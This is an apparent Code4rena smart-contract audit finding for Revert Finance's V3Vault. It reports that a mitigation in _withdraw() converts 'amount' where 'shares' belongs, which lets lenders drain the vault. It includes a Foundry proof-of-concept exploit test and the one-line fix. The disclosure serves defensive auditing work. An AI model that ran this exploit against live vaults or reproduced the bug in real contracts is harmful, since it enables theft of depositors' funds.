# [H] Lenders can drain the Vault when withdrawing

## Summary
Severity: High
Chain: Smart contract
Component: 2024-04-revert-mitigation
Published: 2024-04-27
Source: https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/65
Type: code-finding

## Details
# Lines of code

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010


# Vulnerability details

## Impact

`V3Vault` can be drained through the `withdraw()` function due to improper asset conversion.

## Vulnerability

[PR-14](https://github.com/revert-finance/lend/pull/14/files) introduced a couple of updates to the `V3Vault` contract in response [to the following finding](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/222) in order to prevent liquidations from getting DOSed.

A changes has also been introduced to `_withdraw()` so that instead of reverting when a lender tries to withdraw more shares than he owns, the amount is automatically reduced to the max withdrawable shares for that lender. This is how the change looks:

https://github.com/revert-finance/lend/blob/audit/src/V3Vault.sol#L1007-L1010
```solidity

 function _withdraw(address receiver, address owner, uint256 amount, bool isShare)
        internal
        returns (uint256 assets, uint256 shares)
    {
        ....

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
        } else {
            assets = amount;
            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);
        }

+        uint256 ownerBalance = balanceOf(owner);
+        if (shares > ownerBalance) {
+            shares = ownerBalance;
+            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
+        }

        ....
    }

```

The problem is that the newly added code does not use the proper variable to convert the owner shares to assets. If you look closely you will see that `_convertToAssets()` uses `amount` instead of `shares` . 

In case the function is called with `isShare == true` (e.g `redeem()`) everything will be ok, since `amount == shares`.
However if `_withdraw()` is called with `isShare == false` (e.g `withdraw()`) the conversion will be wrong, because `amount == assets`. This will inflate the assets variable and since there are no checks after that to prevent it, more tokens will be transferred to the owner than he owns.

## POC

I've coded a short POC in the `V3Vault.t.sol` test file to demonstrate the vulnerability

Short summary of the POC:

- A deposit is created for 10 USDC
- The vault is funded with additional assets 
- `lastLendExchangeRateX96` is increased by 2% to simulate exchange rate dynamics
- owner calls `withdraw()` with an amount that is above the shares he owns so that the check can be activated
- owner receives the original 10 USDC + 10.3 USDC on top - effectively draining the pool
 

```solidity
using stdStorage for StdStorage;
....
function testWithdrawExploit(uint256 amount) external {
        // 0 borrow loan
        _setupBasicLoan(false);

        // provide additional 1000 USDC to vault
        deal(address(USDC), address(vault), 1000e6);

        uint256 lent = vault.lendInfo(WHALE_ACCOUNT);
        uint256 lentShares = vault.balanceOf(WHALE_ACCOUNT);

        // check max withdraw
        uint256 maxWithdrawal = vault.maxWithdraw(WHALE_ACCOUNT);

        // total available assets in vault is 1e9
        assertEq(vault.totalAssets(), 1e9);

        // lender can withdraw max 1e7 based on his shares
        assertEq(maxWithdrawal, 1e7);

        // balance before transfer
        uint256 balanceBefore = USDC.balanceOf(WHALE_ACCOUNT);

        // simulate lend exchange rate increases by 2%
        stdstore
            .target(address(vault))
            .sig("lastLendExchangeRateX96()")
            .checked_write(Q96 + ((Q96 * 2) / 100));

        vm.prank(WHALE_ACCOUNT);
        // activate  `shares > ownerBalance` check
        // by trying to withdraw more shares than owned
        vault.withdraw(maxWithdrawal * 2, WHALE_ACCOUNT, WHALE_ACCOUNT);

        // balance after transfer
        uint256 balanceAfter = USDC.balanceOf(WHALE_ACCOUNT);

        uint256 withdrawn = balanceAfter - balanceBefore;

        // lender has withdrawn more than he should
        assertGt(withdrawn, maxWithdrawal);

        // for initial deposit of 10 USDC, the lender received 10 USDC extra
        assertEq(withdrawn - maxWithdrawal, 10399999);
    }
```

## Recommended Mitigation

Refactor the newly added check inside `_withdraw()` to use `shares` instead of `amount`:

```solidity
 uint256 ownerBalance = balanceOf(owner);
        if (shares > ownerBalance) {
            shares = ownerBalance;
-            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
+            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Down);
        }
```


## Assessed type

Invalid Validation
